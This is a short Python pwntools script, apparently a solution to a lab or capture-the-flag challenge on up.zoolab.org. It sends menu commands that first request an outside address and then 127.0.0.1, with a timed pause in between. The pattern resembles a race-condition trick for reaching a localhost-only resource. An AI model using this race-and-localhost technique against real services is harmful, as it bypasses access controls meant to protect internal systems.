from pwn import *
import time

def main():

    conn = remote('up.zoolab.org', 10932)

    conn.sendline(b'g')
    conn.sendline(b'192.168.0.1/10000')
    conn.sendline(b'g')
    conn.sendline(b'127.0.0.1/45678')
    time.sleep(0.5)
    conn.sendline(b'v')
    conn.interactive()
    conn.close() 

if __name__ == '__main__':
    main()
